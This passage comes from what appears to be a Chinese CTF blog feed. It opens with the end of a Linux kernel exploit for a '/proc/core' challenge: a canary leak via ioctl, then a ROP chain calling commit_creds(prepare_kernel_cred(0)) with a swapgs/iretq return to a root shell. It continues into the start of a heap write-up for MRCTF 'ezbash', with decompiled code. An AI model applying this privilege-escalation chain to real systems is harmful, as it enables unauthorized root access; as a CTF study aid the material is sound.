&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">SaveStatus</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> __asm__(</span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_cs, cs;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_ss, ss;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_sp, rsp;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\"> );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">GetShell</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!getuid()) &#123;</span><br><span class=\"line\">  system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] CAN NOT GETSHELL.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> <span class=\"type\">size_t</span> rop[<span class=\"number\">0x100</span>];</span><br><span class=\"line\"> <span class=\"type\">char</span> user_buf[<span class=\"number\">0x40</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"> <span class=\"type\">char</span>* ptr;</span><br><span class=\"line\"> <span class=\"type\">int</span> i = <span class=\"number\">8</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> SaveStatus();</span><br><span class=\"line\"> GetAddress();</span><br><span class=\"line\"> vmlinux_base = commit_creds - <span class=\"number\">0x9c8e0</span>;</span><br><span class=\"line\"> <span class=\"type\">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class=\"line\"> <span class=\"type\">size_t</span> pop_rdi = <span class=\"number\">0xffffffff81679ba8</span> + offset;</span><br><span class=\"line\"> <span class=\"type\">size_t</span> pop_rdx = <span class=\"number\">0xffffffff810a0f49</span> + offset;</span><br><span class=\"line\"> <span class=\"type\">size_t</span> mov_rdi_rax = <span class=\"number\">0xffffffff8106a6d2</span> + offset; <span class=\"comment\">// mov rdi, rax; jmp rdx;</span></span><br><span class=\"line\"> <span class=\"type\">size_t</span> swapgs = <span class=\"number\">0xffffffff81a012da</span> + offset;  <span class=\"comment\">// swapgs; popfq; ret;</span></span><br><span class=\"line\"> <span class=\"type\">size_t</span> iretq = <span class=\"number\">0xffffffff81050ac2</span> + offset;   <span class=\"comment\">// iretq; ret;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"type\">int</span> fd = open(<span class=\"string\">&quot;/proc/core&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!fd) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] OPEN /proc/core ERROR.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> ioctl(fd, CORE_OFF, <span class=\"number\">0x40</span>);\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"> ioctl(fd, <span class=\"number\">0x6677889B</span>, user_buf); <span class=\"comment\">//canary in buf.</span></span><br><span class=\"line\"> <span class=\"type\">size_t</span> canary = ((<span class=\"type\">size_t</span>*)user_buf)[<span class=\"number\">0</span>];</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] Find canary: 0x%llx\\n&quot;</span>, canary);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">//commit_creads(prepare_kernel_cred(0));</span></span><br><span class=\"line\"> rop[i++] = canary;</span><br><span class=\"line\"> rop[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\"> rop[i++] = pop_rdi;</span><br><span class=\"line\"> rop[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\"> rop[i++] = prepare_kernel_cred;</span><br><span class=\"line\"> rop[i++] = pop_rdx;</span><br><span class=\"line\"> rop[i++] = commit_creds;</span><br><span class=\"line\"> rop[i++] = mov_rdi_rax;</span><br><span class=\"line\"> <span class=\"comment\">//swapgs --&gt; iretq: rip, cs, rflags, rsp, ss. GetShell</span></span><br><span class=\"line\"> rop[i++] = swapgs;</span><br><span class=\"line\"> rop[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\"> rop[i++] = iretq;</span><br><span class=\"line\"> rop[i++] = (<span class=\"type\">size_t</span>)GetShell;</span><br><span class=\"line\"> rop[i++] = user_cs;</span><br><span class=\"line\"> rop[i++] = user_rflags;</span><br><span class=\"line\"> rop[i++] = user_sp;</span><br><span class=\"line\"> rop[i++] = user_ss;</span><br><span class=\"line\"> </span><br><span class=\"line\"> write(fd, rop, <span class=\"keyword\">sizeof</span>(rop));</span><br><span class=\"line\">    ioctl(fd, CORE_COPY, <span class=\"number\">0xffffffffffff0000</span>|<span class=\"number\">0x100</span>);</span><br><span class=\"line\">    <span class=\"comment\">//传入一个负数，因为会被转为16位（2bytes）无符号数，最后的调用为 qmemcpy(v2, &amp;name, 0x100);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"如何上穿exp\"><a class=\"markdownIt-Anchor\" href=\"#如何上穿exp\">#</a> 如何上穿 exp。？</h2>\n",
            "tags": [
                "learning"
            ]
        },
        {
            "id": "http://example.com/2022/04/25/MRCTF-ezbash/",
            "url": "http://example.com/2022/04/25/MRCTF-ezbash/",
            "title": "MRCTF_ezbash",
            "date_published": "2022-04-25T04:53:57.000Z",
            "content_html": "<h1 id=\"mrctf-pwnezbash\"><a class=\"markdownIt-Anchor\" href=\"#mrctf-pwnezbash\">#</a> MRCTF \tpwn\tezbash</h1>\n<p>拿到题目的时候，直接运行起来发现是一个文件系统，怀疑是不是一个 kernel 的题目，但是并没有给出内核文件，所以认定了就是一道堆题。这也是我坚持做下去的原因。</p>\n<h2 id=\"题目链接\"><a class=\"markdownIt-Anchor\" href=\"#题目链接\">#</a> 题目链接</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RyZWFta2VjYXQvZHJlYW1rZWNhdC5naXRodWIuaW8vdHJlZS9tYWluL2NoYWxsZW5nZS9NUmN0Zl9lemJhc2g=\">https://github.com/dreamkecat/dreamkecat.github.io/tree/main/challenge/MRctf_ezbash</span></p>\n<h2 id=\"环境\"><a class=\"markdownIt-Anchor\" href=\"#环境\">#</a> 环境</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ strings libc.so.6 |grep ubuntu</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.</span><br><span class=\"line\">&lt;https://bugs.launchpad.net/ubuntu/+<span class=\"built_in\">source</span>/glibc/+bugs&gt;.</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$  checksec --file=ezbash</span><br><span class=\"line\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span><br><span class=\"line\">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols\t  No\t0\t\t7\t\tezbash</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ </span><br></pre></td></tr></table></figure>\n<p>2.31 的题目，保护全开，八成就是堆题；</p>\n<p>程序模拟了一个简单的文件系统，提供了 11 种命令，对于我们命令行的输出，程序会进行切片</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ ./ezbash</span><br><span class=\"line\">hacker:/$ <span class=\"built_in\">help</span></span><br><span class=\"line\">Welcome to ezbash</span><br><span class=\"line\">Just have fun here!</span><br><span class=\"line\">The following are built <span class=\"keyword\">in</span>:</span><br><span class=\"line\"><span class=\"built_in\">cd</span></span><br><span class=\"line\"><span class=\"built_in\">ls</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span></span><br><span class=\"line\"><span class=\"built_in\">touch</span></span><br><span class=\"line\"><span class=\"built_in\">rm</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span></span><br><span class=\"line\"><span class=\"built_in\">pwd</span></span><br><span class=\"line\"><span class=\"built_in\">help</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br><span class=\"line\">hacker:/$</span><br></pre></td></tr></table></figure>\n<p>解决题目的第一个难点就是对于代码的审计，因为命令太多，相较于传统的菜单堆题，这道题提供的命令太多，导致分析题目需要很多时间。</p>\n<h2 id=\"解题过程\"><a class=\"markdownIt-Anchor\" href=\"#解题过程\">#</a> 解题过程</h2>\n<h3 id=\"题目的整体把握\"><a class=\"markdownIt-Anchor\" href=\"#题目的整体把握\">#</a> 题目的整体把握</h3>\n<p>题目的所有文件的操作都是基于堆块，以及链表的数据结构</p>\n<p>重要的结构体</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000</span> file            struc ; (<span class=\"keyword\">sizeof</span>=<span class=\"number\">0x40</span>, mappedto_9)</span><br><span class=\"line\"><span class=\"number\">00000000</span> flag            dd ?</span><br><span class=\"line\"><span class=\"number\">00000004</span> name            db <span class=\"number\">16</span> dup(?)            ; <span class=\"built_in\">string</span>(C)</span><br><span class=\"line\"><span class=\"number\">00000014</span> field_14        dd ?</span><br><span class=\"line\"><span class=\"number\">00000018</span> context         dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000020</span> prev_bro        dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000028</span> next_bro        dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000030</span> futher          dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000038</span> firstson        dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000040</span> file            ends</span><br></pre></td></tr></table></figure>\n<p>整个体系中，其实概括 i 起来就是对于目录以及文件的操作，而这些对象都是基于 file 的结构体。flag 标志，对应的是目录（文件夹）或者文件，flag=0，表示的是文件夹，flag=1 表示的文件。文件夹中的所有子文件以及子文件夹都会通过一个双链表联系起来。file 的 firstson 会储存子文件链表的头指针。头节点的 prev_bro 和尾节点的 neat_bro 为 0，name16 字节的数组是 file 的名字，文件夹还会记录自己的父文件夹是的指针。文件则不会，但是文件会有一个特殊的 context 指针，指向另外一个堆块，用于储存写入文件的内容。</p>\n<p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_BYTE *<span class=\"title function_\">readn</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  _BYTE *ptr; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = <span class=\"number\">0x150</span>;</span><br><span class=\"line\">  v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  ptr = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x150</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: allocation error\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x19</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v3 = getchar();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">-1</span> || v3 == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    ptr[v2++] = v3;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v2 &gt;= v1 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v1 += <span class=\"number\">0x150</span>;</span><br><span class=\"line\">      ptr = <span class=\"built_in\">realloc</span>(ptr, v1);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        fwrite(<span class=\"string\">&quot;ezbash: allocation error\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x19</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ptr[v2] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ptr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对于我们输入的命令默认是存放在一个 0x161 的堆块，但是当我们输入的长度过长时，会调整堆块的大小，所以这里是不存在在溢出的，虽然结尾没有补零，但是每次都会被 v1=0x150 限制，没有溢出的利用。</p>\n<p>对于每条命令，他的解析不是直接的匹配，而是会对数据进行切片的处理，如下，调用 strtok 库函数，会返回 delim 的前地址（代码中可能是由于 idapro 分析错误， i = strtok (0LL, &quot;\\t\\r\\n\\a&quot;)，实际上会完全分析我们输入的命令，应该是 i = strtok (i, &quot;\\t\\r\\n\\a&quot;)）这里会将我们的命令分解成操作命令，对象，对吧对应字符串的地址保存在另一个堆块里面。strtok 遇到空字符结束。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_QWORD *__fastcall <span class=\"title function_\">process</span><span class=\"params\">(<span class=\"type\">char</span> *a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+1Ch] [rbp-14h]</span></span><br><span class=\"line\">  _QWORD *ptr; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *i; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = <span class=\"number\">64</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  ptr = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x200</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: allocation error\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x19</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = strtok(a1, <span class=\"string\">&quot; \\t\\r\\n\\a&quot;</span>); i; i = strtok(<span class=\"number\">0LL</span>, <span class=\"string\">&quot; \\t\\r\\n\\a&quot;</span>) )<span class=\"comment\">// split</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ptr[v3++] = i;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 &gt;= v2 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v2 += <span class=\"number\">0x40</span>;</span><br><span class=\"line\">      ptr = <span class=\"built_in\">realloc</span>(ptr, <span class=\"number\">8LL</span> * v2);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        fwrite(<span class=\"string\">&quot;ezbash: allocation error\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x19</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ptr[v3] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ptr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>后面指令的实现都是通过保留的字符串指针分析比较的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">check</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !*cmd )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; L11(); ++i )                 <span class=\"comment\">// i&lt;11</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(*cmd, *(&amp;<span class=\"built_in\">list</span> + i)) )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> (funcs[i])(cmd);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s: command not found\\n&quot;</span>, *cmd);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>list 保存各个命令的名称进行比较，cmd 是处理后的保留字符串地址的 chunk。fucns 保存各个命令的函数的地址。</p>\n<p>程序会使用 2 个全局变量记录我们的当前位置，一个是我们所在的文件夹的指针，一个是字符串记录的是从 home 到当前位置的路径的名字。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:<span class=\"number\">0000000000006140</span> cur_position_addr db <span class=\"number\">50</span>h <span class=\"title function_\">dup</span><span class=\"params\">(?)</span>         ; DATA XREF: apwd+<span class=\"number\">10</span>↑o</span><br><span class=\"line\">.bss:<span class=\"number\">0000000000006140</span>                                         ; acd+<span class=\"number\">10F</span>↑o ...</span><br><span class=\"line\">.bss:<span class=\"number\">0000000000006190</span> ; file *cuurr_pos</span><br><span class=\"line\">.bss:<span class=\"number\">0000000000006190</span> cuurr_pos       dq ?                    ; DATA XREF: unlink:loc_15F0↑r</span><br></pre></td></tr></table></figure>\n<p>其实真正利用的命令没有多少，ls，pwd，help，exit，cd，cat，touch, 都没有漏洞的利用。</p>\n<h4 id=\"ls\"><a class=\"markdownIt-Anchor\" href=\"#ls\">#</a> ls</h4>\n<p>列出当前文件夹下的内容，或者以及子文件夹的内容，成灰只可以识别到以及子文件夹，对于 A/B, 成为程序人为这是一个 file 的名称，而不是一条路径。但是./A 是有效的，程序会识别./ 为当前目录。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">als</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> **cmd, __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v4; <span class=\"comment\">// rsp</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v8; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v9; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  __int64 v10[<span class=\"number\">3</span>]; <span class=\"comment\">// [rsp+8h] [rbp-A0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> **comment; <span class=\"comment\">// [rsp+20h] [rbp-88h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v12; <span class=\"comment\">// [rsp+37h] [rbp-71h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v13; <span class=\"comment\">// [rsp+38h] [rbp-70h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v14; <span class=\"comment\">// [rsp+3Ch] [rbp-6Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> nums; <span class=\"comment\">// [rsp+40h] [rbp-68h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v16; <span class=\"comment\">// [rsp+44h] [rbp-64h]</span></span><br><span class=\"line\">  file *v17; <span class=\"comment\">// [rsp+48h] [rbp-60h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *s1; <span class=\"comment\">// [rsp+50h] [rbp-58h]</span></span><br><span class=\"line\">  file *v19; <span class=\"comment\">// [rsp+58h] 